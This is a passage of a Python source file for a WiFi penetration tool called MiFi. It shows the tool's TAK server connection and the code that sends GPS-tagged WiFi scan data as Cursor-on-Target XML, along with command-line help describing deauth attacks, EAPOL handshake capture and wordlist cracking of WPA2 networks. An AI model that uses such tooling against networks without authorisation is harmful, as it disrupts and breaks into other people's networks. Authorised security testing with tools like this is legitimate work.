                                self.log("TAK Connection Debug - Connecting by IP address, hostname verification disabled", indent=4, prefix="dot")
                        else:
                            # Connecting by hostname - use it for verification
                            tls_hostname = host
                            if self.verbose:
                                self.log(f"TAK Connection Debug - Connecting by hostname '{host}', hostname verification enabled", indent=4, prefix="dot")
                        
                        if self.verbose:
                            self.log("TAK Connection Debug - Starting TLS/SSL handshake", indent=4, prefix="dot")
                        self.tak_socket = context.wrap_socket(self.tak_socket, server_hostname=tls_hostname)
                        if self.verbose:
                            self.log("TAK Connection Debug - TLS/SSL handshake successful", indent=4, prefix="dot")
                    except ImportError:
                        self.log("SSL support not available. Install ssl module.", prefix="error", indent=4)
                        return False
                    except ssl.SSLError as e:
                        self.log(f"SSL/TLS handshake error: {e}", prefix="error", indent=4)
                        return False
                    except Exception as e:
                        self.log(f"TLS handshake error: {e}", prefix="error", indent=4)
                        return False
                else:
                    if self.verbose:
                        self.log("TAK Connection Debug - Using plain TCP (no TLS)", indent=4, prefix="dot")
            else:  # UDP
                self.tak_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # UDP doesn't require connection, but we can test if host is reachable
                try:
                    # Try to resolve hostname
                    socket.gethostbyname(host)
                except socket.gaierror:
                    self.log(f"Cannot resolve TAK server hostname: {host}", prefix="error", indent=4)
                    return False
            
            self.tak_connected = True
            self.log(f"Connected to TAK server at {host}:{port} via {protocol.upper()}", prefix="check", indent=4)
            
            # Verbose connection information for troubleshooting
            if self.verbose:
                self.log("TAK Connection Debug - Connection details:", indent=4, prefix="dot")
                self.log(f"  Host: {host}", indent=8, prefix="dot")
                self.log(f"  Port: {port}", indent=8, prefix="dot")
                self.log(f"  Protocol: {protocol.upper()}", indent=8, prefix="dot")
                # Determine TLS status
                use_tls_debug = cert_file and (cert_file.lower().endswith(('.p12', '.pfx')) or key_file)
                self.log(f"  SSL/TLS: {'Yes' if use_tls_debug else 'No'}", indent=8, prefix="dot")
                if use_tls_debug and cert_file.lower().endswith(('.p12', '.pfx')):
                    self.log(f"  Certificate Format: PKCS#12 (.p12)", indent=8, prefix="dot")
                if cert_file:
                    self.log(f"  Certificate: {cert_file} ({'EXISTS' if os.path.exists(cert_file) else 'NOT FOUND'})", indent=8, prefix="dot")
                if key_file:
                    self.log(f"  Private Key: {key_file} ({'EXISTS' if os.path.exists(key_file) else 'NOT FOUND'})", indent=8, prefix="dot")
                if ca_file:
                    self.log(f"  CA Certificate: {ca_file} ({'EXISTS' if os.path.exists(ca_file) else 'NOT FOUND'})", indent=8, prefix="dot")
                self.log(f"  API Token: {'SET' if api_token else 'NOT SET'}", indent=8, prefix="dot")
                self.log(f"  Socket Type: {type(self.tak_socket).__name__}", indent=8, prefix="dot")
                if hasattr(self.tak_socket, 'getpeername'):
                    try:
                        peer = self.tak_socket.getpeername()
                        self.log(f"  Remote Address: {peer[0]}:{peer[1]}", indent=8, prefix="dot")
                    except:
                        pass
                if hasattr(self.tak_socket, 'getsockname'):
                    try:
                        local = self.tak_socket.getsockname()
                        self.log(f"  Local Address: {local[0]}:{local[1]}", indent=8, prefix="dot")
                    except:
                        pass
            
            # Send initial presence message to register with TAK server
            # TAK Server 5.6 requires this CoT message to recognize the client connection
            try:
                if self.debug:
                    self.log("About to call _send_tak_presence()...", indent=4, prefix="dot")
                self._send_tak_presence()
                if self.debug:
                    self.log("_send_tak_presence() returned", indent=4, prefix="dot")
                # Small delay to ensure message is sent
                time.sleep(0.1)
                
                # Test connection by checking if socket is still writable
                if self.tak_protocol == 'tcp':
                    try:
                        # Try to send a test packet (non-blocking check)
                        self.tak_socket.settimeout(0.1)
                        # Connection is good if we got here
                        self.tak_socket.settimeout(10)  # Reset timeout
                        self.log("TAK connection verified - presence message sent", indent=4, prefix="check")
                        if self.verbose:
                            self.log("TAK Connection Debug - Connection test passed", indent=4, prefix="dot")
                    except Exception as e:
                        self.log(f"TAK connection test failed: {e}", prefix="error", indent=4)
                        if self.verbose:
                            import traceback
                            self.log("TAK Connection Debug - Connection test error:", indent=4, prefix="dot")
                            for line in traceback.format_exc().split('\n'):
                                if line.strip():
                                    self.log(f"  {line}", indent=8, prefix="dot")
                        self.tak_connected = False
                        return False
            except Exception as e:
                self.log(f"Failed to send initial presence message: {e}", prefix="error", indent=4)
                self.log("TAK connection failed - cannot proceed without successful registration", prefix="error", indent=4)
                self.tak_connected = False
                return False
            
            if self.debug:
                self.log("init_tak_connection: About to return True", indent=4, prefix="dot")
            return True
        except socket.timeout:
            self.log(f"Connection timeout: TAK server at {host}:{port} did not respond", prefix="error", indent=4)
            self.tak_connected = False
            return False
        except socket.gaierror as e:
            self.log(f"DNS resolution failed for {host}: {e}", prefix="error", indent=4)
            self.tak_connected = False
            return False
        except socket.error as e:
            self.log(f"Network error connecting to {host}:{port}: {e}", prefix="error", indent=4)
            self.tak_connected = False
            return False
        except Exception as e:
            self.log(f"Failed to connect to TAK server: {e}", prefix="error", indent=4)
            self.tak_connected = False
            return False

    def close_tak_connection(self):
        """Close TAK server connection."""
        if self.tak_socket:
            try:
                self.tak_socket.close()
            except:
                pass
            self.tak_socket = None
        self.tak_connected = False

    def _send_tak_presence(self):
        """
        Send initial presence message to TAK server to register this client.
        TAK Server requires this to recognize the connection as a valid client.
        """
        from datetime import datetime, timezone, timedelta
        
        # Generate unique client UID (use hostname for uniqueness)
        import socket as sock_module
        try:
            hostname = sock_module.gethostname()
        except:
            hostname = "mifi"
        uid = f"MiFi-Scanner-{hostname}"
        
        # Current time in ISO 8601 format (TAK Server requires precise timestamps)
        now = datetime.now(timezone.utc)
        now_str = now.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
        stale_time = now + timedelta(seconds=120)  # 2 minutes stale
        stale = stale_time.strftime('%Y-%m-%dT%H:%M:%S') + 'Z'
        
        # Create presence event - TAK Server 5.6 compatible format
        # Use t-x-c-t (presence/contact) type for client registration
        event = ET.Element('event')
        event.set('version', '2.0')
        event.set('uid', uid)
        event.set('type', 't-x-c-t')  # Presence/contact type for client registration
        event.set('how', 'm-g')  # Machine-generated (required for automated clients)
        event.set('time', now_str)
        event.set('start', now_str)
        event.set('stale', stale)
        
        # Point element - use GPS data if available, otherwise default
        point = ET.SubElement(event, 'point')
        if self.debug:
            self.log("_send_tak_presence: Getting GPS position...", indent=8, prefix="dot")
        gps_data = self.get_gps_position()
        if self.debug:
            self.log(f"_send_tak_presence: GPS data retrieved: {gps_data is not None}", indent=8, prefix="dot")
        if gps_data and gps_data.get('latitude') and gps_data.get('longitude'):
            lat = gps_data.get('latitude', 0)
            lon = gps_data.get('longitude', 0)
            alt = gps_data.get('altitude', 0) if gps_data.get('altitude') else 0
            point.set('lat', f'{lat:.8f}')
            point.set('lon', f'{lon:.8f}')
            point.set('hae', f'{alt:.1f}' if alt else '9999999.0')
        else:
            point.set('lat', '0.0')
            point.set('lon', '0.0')
            point.set('hae', '9999999.0')
        point.set('ce', '9999999.0')
        point.set('le', '9999999.0')
        
        # Detail element with contact information
        detail = ET.SubElement(event, 'detail')
        contact = ET.SubElement(detail, 'contact')
        contact.set('callsign', 'MiFi-Scanner')
        contact.set('endpoint', '*:-1:stcp')
        
        # Status element - indicates this is a presence/status update
        status = ET.SubElement(detail, 'status')
        status.set('battery', '100')
        status.set('readiness', 'true')
        
        # Track element - helps TAK Server track the client
        track = ET.SubElement(detail, 'track')
        track.set('course', '0.0')
        track.set('speed', '0.0')
        
        # Precision location (optional but helps TAK Server)
        precisionlocation = ET.SubElement(detail, 'precisionlocation')
        precisionlocation.set('geopointsrc', 'GPS')
        precisionlocation.set('altsrc', 'GPS')
        
        # Remarks element - additional info for TAK Server
        remarks = ET.SubElement(detail, 'remarks')
        remarks.text = f"MiFi WiFi Scanner - Host: {hostname}"
        
        # Link element - important for TAK Server to track the source
        link = ET.SubElement(detail, 'link')
        link.set('uid', uid)
        link.set('type', 'a-f-G-U-C')  # Unit type for the link
        link.set('relation', 'p-p')  # Parent-parent relation
        
        # Convert to XML and send
        if self.debug:
            self.log("_send_tak_presence: Converting to XML...", indent=8, prefix="dot")
        xml_str = ET.tostring(event, encoding='unicode')
        
        if self.tak_protocol == 'tcp':
            message = xml_str.encode('utf-8')
            length = len(message)
            header = length.to_bytes(4, byteorder='big')
            try:
                if self.debug:
                    self.log(f"_send_tak_presence: About to send {len(header) + len(message)} bytes...", indent=8, prefix="dot")
                # Set a timeout to prevent hanging
                original_timeout = self.tak_socket.gettimeout()
                if self.debug:
                    self.log(f"_send_tak_presence: Original timeout: {original_timeout}, setting to 5.0", indent=8, prefix="dot")
                self.tak_socket.settimeout(5.0)  # 5 second timeout for send
                if self.debug:
                    self.log("_send_tak_presence: Calling sendall()...", indent=8, prefix="dot")
                self.tak_socket.sendall(header + message)
                if self.debug:
                    self.log("_send_tak_presence: sendall() completed successfully", indent=8, prefix="dot")
                # Restore original timeout (or None if it was None)
                self.tak_socket.settimeout(original_timeout)
                if self.verbose:
                    self.log(f"TAK Presence Debug - Sent {len(header) + len(message)} bytes (header: {len(header)}, payload: {len(message)})", indent=4, prefix="dot")
            except Exception as e:
                if self.verbose:
                    self.log(f"TAK Presence Debug - Send error: {e}", indent=4, prefix="error")
                # Restore timeout even on error
                try:
                    self.tak_socket.settimeout(original_timeout)
                except:
                    pass
                raise
        else:  # UDP
            bytes_sent = self.tak_socket.sendto(xml_str.encode('utf-8'), (self.tak_host, self.tak_port))
            if self.verbose:
                self.log(f"TAK Presence Debug - Sent {bytes_sent} bytes via UDP", indent=4, prefix="dot")
        
        if self.verbose:
            self.log(f"Sent TAK presence message (UID: {uid}, Type: t-x-c-t, How: m-g)", indent=4, prefix="check")
            self.log(f"TAK Presence Debug - Presence CoT XML:", indent=4, prefix="dot")
            preview = xml_str[:500] + "..." if len(xml_str) > 500 else xml_str
            for line in preview.split('\n')[:10]:  # First 10 lines
                if line.strip():
                    self.log(f"  {line.strip()}", indent=8, prefix="dot")
        else:
            self.log("Sent TAK presence message to register client", indent=4, prefix="check")

    def generate_cot_message(self, essid, bssid, channel, signal_strength, gps_data, event_type='a-f-G-E-V-C', remarks=None):
        """
        Generate a CoT (Cursor on Target) XML message for WiFi network data.
        Format is compatible with TAK Server 5.6 native CoT reception.
        
        Args:
            essid: Network ESSID (name)
            bssid: Network BSSID (MAC address)
            channel: WiFi channel
            signal_strength: Signal strength in dBm
            gps_data: Dictionary with 'latitude', 'longitude', 'altitude'
            event_type: CoT event type (default: 'a-f-G-E-V-C' for equipment)
            remarks: Optional custom remarks text (if None, generates default remarks)
        
        Returns:
            XML string in CoT format
        """
        from datetime import datetime, timezone, timedelta
        
        # Generate unique UID from BSSID (ensures each network has unique identifier)
        # Ensure bssid is a string (define once, use throughout)
        try:
            bssid_str = str(bssid) if bssid else 'unknown'
            uid = f"mifi-{bssid_str.replace(':', '').lower()}"
        except Exception as e:
            # Verbose debugging
            if hasattr(self, 'verbose') and self.verbose:
                self.log(f"TAK CoT Debug - Error in UID generation: {e}", indent=8, prefix="dot")
                self.log(f"TAK CoT Debug - bssid value: {repr(bssid)}, type: {type(bssid)}", indent=8, prefix="dot")
            raise
        
        # Current time in ISO 8601 format (TAK Server requires UTC timestamps)
        now = datetime.now(timezone.utc)
        now_str = now.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
        # Use very long stale time (24 hours) so data persists on TAK map after execution completes
        stale_time = now + timedelta(hours=24)  # 24 hours stale - data persists on map
        stale = stale_time.strftime('%Y-%m-%dT%H:%M:%S') + 'Z'
        
        # Create CoT event element - TAK Server 5.6 compatible format
        event = ET.Element('event')
        event.set('version', '2.0')
        event.set('uid', uid)
        event.set('type', event_type)
        event.set('how', 'm-g')  # Machine-generated (required for automated clients)
        event.set('time', now_str)
        event.set('start', now_str)
        event.set('stale', stale)
        
        # Point element with GPS coordinates (required by TAK Server)
        point = ET.SubElement(event, 'point')
        lat = gps_data.get('latitude', 0)
        lon = gps_data.get('longitude', 0)
        alt = gps_data.get('altitude', 0) if gps_data.get('altitude') else 0
        
        point.set('lat', f'{lat:.8f}')
        point.set('lon', f'{lon:.8f}')
        point.set('hae', f'{alt:.1f}' if alt else '9999999.0')
        point.set('ce', '50.0')  # Circular error in meters (reasonable estimate)
        point.set('le', '50.0')  # Linear error in meters
        
        # Detail element with network information
        detail = ET.SubElement(event, 'detail')
        
        # Contact element - network identification
        contact = ET.SubElement(detail, 'contact')
        # Ensure essid is a string
        essid_str = str(essid) if essid else 'Unknown'
        contact.set('callsign', essid_str)
        contact.set('endpoint', '*:-1:stcp')
        
        # Status element - signal strength as battery metaphor
        status = ET.SubElement(detail, 'status')
        # Convert signal strength to battery percentage (rough approximation)
        # -30 dBm = 100%, -90 dBm = 0%
        # Ensure signal_strength is converted to int/float first
        try:
            signal_num = float(signal_strength) if isinstance(signal_strength, str) else signal_strength
            battery = max(0, min(100, int((signal_num + 90) * 100 / 60)))
        except (ValueError, TypeError) as e:
            # If conversion fails, default to 50%
            if hasattr(self, 'verbose') and self.verbose:
                self.log(f"TAK CoT Debug - Error converting signal_strength: {e}, using default 50%", indent=8, prefix="dot")
            battery = 50
        status.set('battery', str(battery))
        
        # Track element (optional, but helps TAK Server)
        track = ET.SubElement(detail, 'track')
        track.set('course', '0.0')
        track.set('speed', '0.0')
        
        # Remarks element with comprehensive network details
        remarks_elem = ET.SubElement(detail, 'remarks')
        # Use custom remarks if provided, otherwise generate default
        if remarks is not None:
            remarks_elem.text = remarks
        else:
            # Ensure all values are strings to avoid concatenation errors
            try:
                bssid_str_remarks = str(bssid) if bssid else 'Unknown'
                channel_str = str(channel) if channel is not None else 'Unknown'
                signal_str = str(signal_strength) if signal_strength is not None else 'Unknown'
                
                # Format timestamp from gps_data if available
                timestamp_str = 'Unknown'
                if gps_data and 'timestamp' in gps_data:
                    try:
                        # Try to format the timestamp nicely
                        if isinstance(gps_data['timestamp'], str):
                            timestamp_str = gps_data['timestamp']
                        else:
                            timestamp_str = str(gps_data['timestamp'])
                    except Exception:
                        timestamp_str = str(gps_data.get('timestamp', 'Unknown'))
                
                # Format coordinates
                coord_str = f"{lat:.6f}, {lon:.6f}"
                if alt and alt != 0:
                    coord_str += f", {alt:.1f}m"
                
                # Create comprehensive remarks with all network data
                remarks_elem.text = f"WiFi Network: {essid_str}\nBSSID: {bssid_str_remarks}\nChannel: {channel_str}\nSignal: {signal_str} dBm\nCoordinates: {coord_str}\nTimestamp: {timestamp_str}"
            except Exception as e:
                # Verbose debugging
                if hasattr(self, 'verbose') and self.verbose:
                    self.log(f"TAK CoT Debug - Error in remarks generation: {e}", indent=8, prefix="dot")
                    self.log(f"TAK CoT Debug - essid_str: {repr(essid_str)}, type: {type(essid_str)}", indent=8, prefix="dot")
                    self.log(f"TAK CoT Debug - bssid: {repr(bssid)}, type: {type(bssid)}", indent=8, prefix="dot")
                    self.log(f"TAK CoT Debug - channel: {repr(channel)}, type: {type(channel)}", indent=8, prefix="dot")
                    self.log(f"TAK CoT Debug - signal_strength: {repr(signal_strength)}, type: {type(signal_strength)}", indent=8, prefix="dot")
                # Fallback to simple remarks on error
                remarks_elem.text = f"WiFi Network: {essid_str}"
        
        # Usericon element - MIL-STD-2525 icon (equipment)
        usericon = ET.SubElement(detail, 'usericon')
        usericon.set('iconsetpath', 'COT_MAPPING_2525C/a-f-G-E-V-C')
        
        # Additional metadata in _flow-tags_ (custom extension)
        _flow_tags_ = ET.SubElement(detail, '_flow-tags_')
        _flow_tags_.set('mifi', 'wifi-network')
        # Use string versions of values (ensure they're defined)
        bssid_str_flow = str(bssid) if bssid else 'Unknown'
        channel_str_flow = str(channel) if channel is not None else 'Unknown'
        signal_str_flow = str(signal_strength) if signal_strength is not None else 'Unknown'
        _flow_tags_.set('bssid', bssid_str_flow)
        _flow_tags_.set('channel', channel_str_flow)
        _flow_tags_.set('signal', signal_str_flow)
        
        # Convert to XML string
        xml_str = ET.tostring(event, encoding='unicode')
        return xml_str

    def send_tak_cot(self, essid, bssid, channel, signal_strength, gps_data, remarks=None):
        """
        Send a CoT message to TAK server in TAK Server 5.6 compatible format.
        Uses native CoT XML format with proper TCP/UDP protocol handling.
        
        Args:
            essid: Network ESSID
            bssid: Network BSSID
            channel: Network channel
            signal_strength: Signal strength in dBm
            gps_data: Dictionary with latitude, longitude, altitude, timestamp
            remarks: Optional custom remarks text (if None, generates default remarks)
        """
        # Check if TAK is enabled and connected with a valid socket
        if not self.tak_enabled or not self.tak_connected or not self.tak_socket:
            return False
        
        # Verbose debugging: Log input parameters
        if self.verbose:
            self.log(f"TAK CoT Debug - Input parameters:", indent=8, prefix="dot")
            self.log(f"  essid: {repr(essid)} (type: {type(essid).__name__})", indent=12, prefix="dot")
            self.log(f"  bssid: {repr(bssid)} (type: {type(bssid).__name__})", indent=12, prefix="dot")
            self.log(f"  channel: {repr(channel)} (type: {type(channel).__name__})", indent=12, prefix="dot")
            self.log(f"  signal_strength: {repr(signal_strength)} (type: {type(signal_strength).__name__})", indent=12, prefix="dot")
            self.log(f"  gps_data: {repr(gps_data)} (type: {type(gps_data).__name__})", indent=12, prefix="dot")
            self.log(f"  remarks: {repr(remarks)} (type: {type(remarks).__name__})", indent=12, prefix="dot")
        
        try:
            # Generate CoT XML message (TAK Server 5.6 compatible format)
            if self.verbose:
                self.log("TAK CoT Debug - Calling generate_cot_message()...", indent=8, prefix="dot")
            cot_xml = self.generate_cot_message(essid, bssid, channel, signal_strength, gps_data, remarks=remarks)
            if self.verbose:
                self.log(f"TAK CoT Debug - Generated XML length: {len(cot_xml)} bytes", indent=8, prefix="dot")
                self.log(f"TAK CoT Debug - XML preview (first 200 chars): {cot_xml[:200]}", indent=8, prefix="dot")
            
            if self.tak_protocol == 'tcp':
                # TAK Server TCP protocol: 4-byte big-endian length prefix + XML payload
                message = cot_xml.encode('utf-8')
                length = len(message)
                # Verify length is reasonable (TAK Server has message size limits)
                if length > 65535:
                    self.log(f"CoT message too large ({length} bytes), truncating", prefix="error", indent=8)
                    return False
                header = length.to_bytes(4, byteorder='big')
                try:
                    bytes_sent = self.tak_socket.sendall(header + message)
                    if self.verbose:
                        self.log(f"TAK CoT Debug - Sent {len(header) + len(message)} bytes (header: {len(header)}, payload: {len(message)})", indent=8, prefix="dot")
                except Exception as e:
                    if self.verbose:
                        self.log(f"TAK CoT Debug - Send error: {e}", indent=8, prefix="error")
                    raise
            else:  # UDP
                # UDP: Send XML directly (no length prefix for UDP)
                message = cot_xml.encode('utf-8')
                if len(message) > 65507:  # UDP max payload size
                    self.log(f"CoT message too large for UDP ({len(message)} bytes)", prefix="error", indent=8)
                    return False
                self.tak_socket.sendto(message, (self.tak_host, self.tak_port))
            
            if self.verbose:
                self.log(f"Sent TAK CoT for {essid} ({bssid}) - {len(cot_xml)} bytes", indent=8, prefix="plus")
                self.log(f"TAK CoT Debug - Message sent successfully via {self.tak_protocol.upper()}", indent=8, prefix="dot")
                # Show a preview of the CoT message
                if len(cot_xml) > 0:
                    preview = cot_xml[:300] + "..." if len(cot_xml) > 300 else cot_xml
                    self.log(f"TAK CoT Debug - CoT XML preview:", indent=8, prefix="dot")
                    for line in preview.split('\n')[:5]:  # First 5 lines
                        if line.strip():
                            self.log(f"  {line.strip()}", indent=12, prefix="dot")
            else:
                # Log first few messages to confirm TAK is working
                if not hasattr(self, '_tak_message_count'):
                    self._tak_message_count = 0
                self._tak_message_count += 1
                if self._tak_message_count <= 3:
                    self.log(f"Sent TAK CoT message #{self._tak_message_count} for {essid}", indent=8, prefix="plus")
            return True
        except socket.error as e:
            self.log(f"Network error sending TAK CoT: {e}", prefix="error", indent=8)
            if self.verbose:
                import traceback
                self.log(f"TAK CoT Debug - Network error traceback:", indent=8, prefix="dot")
                for line in traceback.format_exc().split('\n'):
                    if line.strip():
                        self.log(f"  {line}", indent=12, prefix="dot")
            self.tak_connected = False
            # Don't try to reconnect automatically - let the main loop handle it
            return False
        except Exception as e:
            self.log(f"Failed to send TAK CoT: {e}", prefix="error", indent=8)
            # Verbose debugging: Show full traceback and error details
            if self.verbose:
                import traceback
                self.log(f"TAK CoT Debug - Error type: {type(e).__name__}", indent=8, prefix="dot")
                self.log(f"TAK CoT Debug - Error message: {str(e)}", indent=8, prefix="dot")
                self.log(f"TAK CoT Debug - Full traceback:", indent=8, prefix="dot")
                for line in traceback.format_exc().split('\n'):
                    if line.strip():
                        self.log(f"  {line}", indent=12, prefix="dot")
                # Show the problematic line if available
                if hasattr(e, '__traceback__') and e.__traceback__:
                    tb = e.__traceback__
                    while tb.tb_next:
                        tb = tb.tb_next
                    frame = tb.tb_frame
                    self.log(f"TAK CoT Debug - Error location: {frame.f_code.co_filename}:{tb.tb_lineno}", indent=8, prefix="dot")
                    self.log(f"TAK CoT Debug - Code context:", indent=8, prefix="dot")
                    try:
                        import linecache
                        line = linecache.getline(frame.f_code.co_filename, tb.tb_lineno)
                        self.log(f"  Line {tb.tb_lineno}: {line.strip()}", indent=12, prefix="dot")
                    except:
                        pass
            # If it's a timestamp error, this is a critical bug - log it clearly
            if "second must be in" in str(e) or "minute must be in" in str(e):
                self.log("CRITICAL: Timestamp calculation error - this should not happen", prefix="error", indent=8)
            # If it's a concatenation error, provide more context
            if "can only concatenate" in str(e) or "must be str" in str(e):
                self.log("CRITICAL: String concatenation error - check variable types", prefix="error", indent=8)
            return False

class RawFormatter(argparse.HelpFormatter):
    def _fill_text(self, text, width, indent):
        # Return text unchanged — no wrapping or indentation added
        return text

def is_running_under_nohup():
            return os.getenv("NOHUP_ACTIVE") == "1"

def reexec_with_nohup():
    args = ["nohup", sys.executable] + sys.argv
    env = os.environ.copy()
    env["NOHUP_ACTIVE"] = "1"
    
    # Send stdout and stderr to /dev/null
    with open(os.devnull, "w") as devnull:
        subprocess.Popen(
            args,
            stdout=devnull,
            stderr=devnull,
            stdin=subprocess.DEVNULL,
            env=env
        )
    sys.exit(0)

if __name__ == "__main__":
    __version__ = "0.2.0"

    parser = argparse.ArgumentParser(
        description="""\
    ┌──────────────────────────────────────────────────────────────────────┐
    │              MiFi Handshake Collector and Processor Tool             │
    ├──────────────────────────────────────────────────────────────────────┤
    │  Modes:                                                              │
    │    • collect-*  → Initial scan for nearby AP's, optional             │
    │                   targeting of stated networks for a deauth attack.  │
    │    • process-*  → Runs a series of hash isolation and analyzation    │
    │                   for stored EAPOL PCAPs.                            │
    │    • full-*     → Configures and runs Collection and Processing      │
    │                   sequentially.                                      │
    │    • *-manual   → Specify target network for collection, and pcap    │
    │                   analysis for processing. This requires terminal    │
    │                   input from the user.                               │
    │    • *-auto     → Attempts deauth attack for all WPA2 networks       │
    │                   detected during the Initial Scan for collection,   │
    │                   and executes all processing methods for all pcaps  │
    │                   in the collection directory.                       │
    │    • target     → Runs scanning on specific essid until it is        │
    │                   detected and an EAPOL handshake is intercepted.    │
    │    • map        → Maps all detected networks and their signal        │
    │                   strengths with GPS for site surveys and heatmaps.  │
    │    • config     → Configures interface for headless operation.       │
    │    • dashboard  → Starts the persistent web dashboard server.        │
    │    • control    → Starts the web-based control panel with real-time  │
    │                   status monitoring and operation controls.          │
    │    • clean      → Removes all log files, clears database, and        │
    │                   resets interface configuration.                    │
    │                                                                      │
    │  Requirements:                                                       │
    │    • python3 installation                                            │
    │    • wifi card capable of monitor mode                               │
    │    • aircrack-ng suite (includes airodump-ng, aireplay-ng,           │
    │      aircrack-ng)                                                    │
    │    • John the Ripper Jumbo (for wpapcap2john)                        │
    │    • config/rockyou.txt (or specify another file)                    │
    │                                                                      │
    ├──────────────────────────────────────────────────────────────────────┤
    │  General Usage:                                                      │
    │    This program is designed to aid in the collection and processing  │
    │    of general Wifi connections. Note that some processing methods    │
    │    are hardware intensive and are better executed on dedicated       │
    │    systems. This program segments the collection and processing      │
    │    aspects to aid in this limitation. Hashcat and JTR functions      │
    │    are available within their respective folders for these purposes. │
    │    We advise only attempting the wordlist attack on less-            │
    │    capable systems. However, this main program does automatically    │
    │    parse through pcap data and preformat it into .22000 and .john    │
    │    formats for condensed data storage.                               │
    │                                                                      │
    │    For -H headless, the interface must already be added to the       │
    │    configs or be in monitor mode for the program to avoid needing    │
    │    user input, i.e. run '--mode config' first.                       │
    │                                                                      │
    │    Please reference -h for specific variables to tailor unique       │
    │    collection or processing requirements.                            │
    │                                                                      │
    │  Examples:                                                           │
    │    sudo python3 ./mifi.py --mode collect-manual                      │
    │       → Runs collection in manual mode, a good place to start for    │
    │         new users.                                                   │
    │                                                                      │
    │    sudo python3 ./mifi.py --mode full-auto -H                        │
    │       → Runs both collect and process modes in auto sub-mode as a    │
    │         background process. All output available in respective logs  │
    │         for review.                                                  │
    │                                                                      │
    │    sudo python3 ./mifi.py --mode target --TID [essid]                │
    │       → Cycles network detection until ESSID is present, then        │
    │         conducts handshake attack until EAPOL is detected.           │
    │                                                                      │
    │    sudo python3 ./mifi.py --mode clean                               │
    │       → Removes all log files, clears the database, and resets       │
    │         interface configuration in config/config.ini.               │
    │                                                                      │
    │  LEGAL DISCLAIMER:                                                   │
    │    This tool is provided for educational and authorized security     │
    │    testing purposes only. Unauthorized use to access networks or     │
    │    data without permission is illegal and punishable by law. The     │
    │    author assumes no responsibility for any misuse or damage caused  │
    │    by this software. Use responsibly and ethically.                  │
    └──────────────────────────────────────────────────────────────────────┘
    """,
        formatter_class=RawFormatter,
        add_help=False
    )

    # Options group for help and version
    options_group = parser.add_argument_group('Options')
    options_group.add_argument(
        "-h", "--help",
        action="help",
        help="Show this help message and exit."
    )
    options_group.add_argument(
        "--version",
        action="version", 
        version=f"MiFi {__version__}"
    )
    options_group.add_argument(
        "--mode",
        choices=["config", "collect-manual", "collect-auto", "process-manual", "process-auto", "full-manual", "full-auto", "target", "map", "dashboard", "clean"],
        required=False,
        help="Specific tool mode for refined behavior and use-case. If omitted, starts interactive CLI server."
    )
    options_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output for subprocess commands. Note this will result in extremely large log files."
    )
    options_group.add_argument(
        "--debug",
        action="store_true",
        help="Enable debug mode for detailed debugging output. Useful for troubleshooting issues."
    )
    options_group.add_argument(
        "-H", "--headless",
        action="store_true",
        help="Activates headless background operation for log-only status."
    )

    # Shared Variables (used by multiple distinct modes)
    shared_group = parser.add_argument_group('Shared Variables')
    shared_group.add_argument(
        "-IS", "--initial-scan",
        metavar="<INITIAL_SCAN_TIME>",
        type=int,
        default=30,
        required=False,
        help="Initial spectrum sweep time in seconds (s). Used by collect and target modes. (Default is 30)"
    )
    shared_group.add_argument(
        "-TS", "--target-scan",
        metavar="<TARGET_SCAN_TIME>",
        type=int,
        default=60,
        required=False,
        help="Target handshake monitoring time in seconds (s). Used by collect and target modes. (Default is 60)"
    )
    shared_group.add_argument(
        "-p", "--packets",
        metavar="<DEAUTH_PACKETS>",
        type=int,
        default=100,
        required=False,
        help="Deauth Packet count sent during handshake monitoring. Used by collect and target modes. (Default is 100)"
    )

    # Collect Mode Options
    collect_group = parser.add_argument_group('Collect Mode Options')
    collect_group.description = "No unique CLI arguments - currently uses all shared variables"
    # Process Mode Options
    process_group = parser.add_argument_group('Process Mode Options')
    process_group.add_argument(
        "-WL", "--word-list",
        metavar="<WORD_LIST>",
        type=str,
        default="config/rockyou.txt",
        required=False,
        help="Specifies path to custom wordlist. (Default is 'config/rockyou.txt')"
    )

    # Target Mode Options
    target_group = parser.add_argument_group('Target Mode Options')
    target_group.add_argument(
        "-TID", "--target-id",
        metavar="<ESSID>",
        type=str,
        help="Specific ESSID to target. Filenames may use a sanitized version of the ESSID for safety (e.g., spaces replaced). Refer to logs to ensure accurate matching."
    )
    target_group.add_argument(
        "-TSA", "--target-search-attempts",
        metavar="<TARGET_SEARCH_ATTEMPTS>",
        type=int,
        default=25,
        help="Number of target search attempts before giving up. Set to 0 for unlimited (Ctrl+C to stop); not allowed in headless mode. (Default is 25)"
    )
    target_group.add_argument(
        "-TA", "--target-attempts",
        metavar="<CAPTURE_ATTEMPTS>",
        type=int,
        default=10,
        help="Number of deauth attacks to capture an EAPOL handshake before giving up. Set to 0 for unlimited (continues until EAPOL detected or Ctrl+C); not allowed in headless mode. (Default is 10)"
    )

    # Map Mode Options
    map_group = parser.add_argument_group('Map Mode Options')
    map_group.add_argument(
        "-MS", "--map-scans",
        metavar="<MAP_SCANS>",
        type=int,
        default=25,
        required=False,
        help="Total number of spectrum scans. Set to 0 for unlimited (Ctrl+C to stop); not allowed in headless mode. (Default is 25)"
    )
    map_group.add_argument(
        "-MSD", "--map-scan-duration",
        metavar="<MAP_SCAN_DURATION>",
        type=int,
        default=1,
        required=False,
        help="Scan duration in seconds (s). (Default is 1)"
    )
    map_group.add_argument(
        "-GPS", "--gps-port",
        metavar="<GPS_PORT>",
        type=str,
        default="/dev/ttyUSB0",
        required=False,
        help="GPS USB port for signal tracking. (Default is '/dev/ttyUSB0')"
    )
    map_group.add_argument(
        "-GLA", "--gps-lock-attempts",
        metavar="<GPS_LOCK_ATTEMPTS>",
        type=int,
        default=20,
        required=False,
        help="Number of attempts to acquire GPS fix before exiting. (Default is 20)"
    )
    map_group.add_argument(
        "-GLW", "--gps-lock-wait",
        metavar="<GPS_LOCK_WAIT>",
        type=int,
        default=5,
        required=False,
        help="Time to wait between GPS fix attempts in seconds (s). (Default is 5)"
    )
    map_group.add_argument(
        "-tak", "--tak",
        action="store_true",
        required=False,
        help="Enable TAK server integration to push WiFi network data to TAK server"
    )
    map_group.add_argument(
        "-tak-host", "--tak-host",
        metavar="<TAK_HOST>",
        type=str,
        default=None,
        required=False,
        help="TAK server hostname or IP address (required if -tak is used)"
    )
    map_group.add_argument(
        "-tak-port", "--tak-port",
        metavar="<TAK_PORT>",
        type=int,
        default=8087,
        required=False,
